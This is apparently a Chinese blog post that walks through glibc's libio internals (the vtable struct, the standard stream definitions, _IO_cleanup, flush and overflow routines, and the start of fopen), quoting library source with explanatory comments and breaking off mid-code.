<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a><code>_IO_jump_t</code></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*_IO_finish_t等变量都为函数指针*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="一些重要结构体实例的定义"><a href="#一些重要结构体实例的定义" class="headerlink" title="一些重要结构体实例的定义"></a>一些重要结构体实例的定义</h1><blockquote>
<p>一般放在.c文件，在头文件中写好extern声明，即可调用不同.c文件中的函数，文件中定义比较散乱，此处定义跨越几个.c文件</p>
</blockquote>
<h2 id="IO-2-1-stdin-IO-2-1-stdout-and-IO-2-1-stderr"><a href="#IO-2-1-stdin-IO-2-1-stdout-and-IO-2-1-stderr" class="headerlink" title="IO_2_1_stdin, IO_2_1_stdout,and IO_2_1_stderr"></a><em>IO_2_1_stdin</em>, <em>IO_2_1_stdout</em>,and <em>IO_2_1_stderr</em></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \</span></span><br><span class="line"><span class="meta">       &#123; _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \</span></span><br><span class="line"><span class="meta">	 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (FILE *) CHAIN, FD, \</span></span><br><span class="line"><span class="meta">	 0, _IO_pos_BAD, 0, 0, &#123; 0 &#125;, 0, _IO_pos_BAD, \</span></span><br><span class="line"><span class="meta">	 NULL, WDP, 0 &#125;</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span></span><br><span class="line"><span class="meta">  static struct _IO_wide_data _IO_wide_data_##FD \</span></span><br><span class="line"><span class="meta">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \</span></span><br><span class="line"><span class="meta">  struct _IO_FILE_plus NAME \</span></span><br><span class="line"><span class="meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \</span></span><br><span class="line"><span class="meta">       &amp;_IO_file_jumps&#125;;</span></span><br><span class="line"></span><br><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libioP.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stdin</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stdout</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stderr</span></span><br><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="IO-file-jumps（存在许多虚表，这里以标准输入输出的filejump为例）"><a href="#IO-file-jumps（存在许多虚表，这里以标准输入输出的filejump为例）" class="headerlink" title="_IO_file_jumps（存在许多虚表，这里以标准输入输出的filejump为例）"></a>_IO_file_jumps（存在许多虚表，这里以标准输入输出的filejump为例）</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_new_file_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_new_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="IO-list-all"><a href="#IO-list-all" class="headerlink" title="_IO_list_all"></a>_IO_list_all</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure>

<h2 id="虚表中各个函数的实现"><a href="#虚表中各个函数的实现" class="headerlink" title="虚表中各个函数的实现"></a>虚表中各个函数的实现</h2><blockquote>
<p>这是其他操作的基础，无论是库的读写接口，还是二次封装的printf之类的函数。</p>
</blockquote>
<p>………………………</p>
<h1 id="一些重要库内辅助函数的实现主要涉及（genops-c）"><a href="#一些重要库内辅助函数的实现主要涉及（genops-c）" class="headerlink" title="一些重要库内辅助函数的实现主要涉及（genops.c）"></a>一些重要库内辅助函数的实现主要涉及（genops.c）</h1><blockquote>
<p>本人比较菜，多线程锁机制基本没怎么考虑。</p>
<p>其中有的函数是对虚表函数的封装</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* _IO_list_all相关，将fp链接进入或链接出去_IO_list_all*/</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp);</span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp);</span><br></pre></td></tr></table></figure>

<h2 id="IO-cleanup-void"><a href="#IO-cleanup-void" class="headerlink" title="_IO_cleanup (void)"></a>_IO_cleanup (void)</h2><h3 id="函数主体-genops-c"><a href="#函数主体-genops-c" class="headerlink" title="函数主体(genops.c)"></a>函数主体(genops.c)</h3><blockquote>
<p>genops这个文件比较抽象，既包括了对外可以直接用的函数，也就是exit等函数会调用的函数，也包括了一些跳表函数实现起来的共同可以使用的函数。</p>
<p>exit函数在结束时会调用此函数，进行缓冲区的刷新和释放。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*清空缓冲区操作，首先会关闭所有的c++的stream流缓冲区，接着执行 _IO_unbuffer_all ();*/</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 下面的处理有点复杂。通常，我们希望使流处于无缓冲状态，以确保随后所有的输出都能被看到。如果我们不关心内存泄漏的问题，那么实际上释放缓冲区并没有太大意义，因为程序终止后缓冲区会自动释放。如果我们确实关心内存泄漏问题，那么就必须释放这些缓冲区。是否释放缓冲区由位于 `libc_freeres` 部分的函数决定。这些函数与 `_IO_cleanup` 一样，都是作为 `atexit` 例程的一部分被调用。问题是我们不知道 `freeres` 代码和 `_IO_cleanup` 哪个会先被调用。如果 `freeres` 代码先被调用，我们将 `DEALLOC_BUFFER` 变量设置为 `true`，然后 `_IO_unbuffer_all` 函数会处理剩下的工作。如果 `_IO_unbuffer_all` 先被调用，我们会将流添加到一个列表中，以便 `freeres` 函数稍后可以遍历该列表。*/</span></span><br><span class="line"><span class="comment">/*legacy为兼容老版本所需*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*注意for循环，一开始没看见想了半天哈哈哈*/</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> legacy = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_vtable_offset (fp) != <span class="number">0</span>))</span><br><span class="line">	legacy = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">	  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">	  &amp;&amp; (legacy || fp-&gt;_mode != <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">	  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">	  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">	    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment">		 stream.  */</span></span><br><span class="line">	      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (! legacy &amp;&amp; ! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">	    &#123;</span><br><span class="line">	      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">	      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">	      freeres_list = fp;</span><br><span class="line">	      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (! legacy &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">	    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">	  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">	    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment">	 used.  */</span></span><br><span class="line">      <span class="keyword">if</span> (! legacy)</span><br><span class="line">	fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="比较重要的宏（libioP-h）"><a href="#比较重要的宏（libioP-h）" class="headerlink" title="比较重要的宏（libioP.h）"></a>比较重要的宏（libioP.h）</h3><blockquote>
<p>以上述函数所用举例</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SETBUF(FP, BUFFER, LENGTH) JUMP2 (__setbuf, FP, BUFFER, LENGTH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"><span class="comment">/*以下为了得到虚表指针*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">				       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE)&#123;&#125;).MEMBER)</span></span><br><span class="line"><span class="comment">/* Offset of member MEMBER in a struct of type TYPE. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE, MEMBER) __builtin_offsetof (TYPE, MEMBER)</span></span><br></pre></td></tr></table></figure>

<h3 id="最终跳表函数的实现（fileops-c）"><a href="#最终跳表函数的实现（fileops-c）" class="headerlink" title="最终跳表函数的实现（fileops.c）"></a>最终跳表函数的实现（fileops.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">FILE *</span><br><span class="line">_IO_default_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">	fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">	_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">	fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">	_IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="IO-flush-all-lockp-int-do-lock"><a href="#IO-flush-all-lockp-int-do-lock" class="headerlink" title="_IO_flush_all_lockp (int do_lock)"></a>_IO_flush_all_lockp (int do_lock)</h2><blockquote>
<p>刷新文件流</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="库内公共接口函数的实现流程示例"><a href="#库内公共接口函数的实现流程示例" class="headerlink" title="库内公共接口函数的实现流程示例"></a>库内公共接口函数的实现流程示例</h1><blockquote>
<p>对genops.c的二次封装</p>
</blockquote>
<h2 id="1-fopen为例"><a href="#1-fopen为例" class="headerlink" title="1. fopen为例"></a>1. fopen为例</h2><blockquote>
<p>主要实现流程，具体函数实现有兴趣的自行观看吧。</p>
</blockquote>
<h3 id="a-fopen-internal（iofopen-c）"><a href="#a-fopen-internal（iofopen-c）" class="headerlink" title="a. __fopen_internal（iofopen.c）"></a>a. __fopen_internal（iofopen.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span 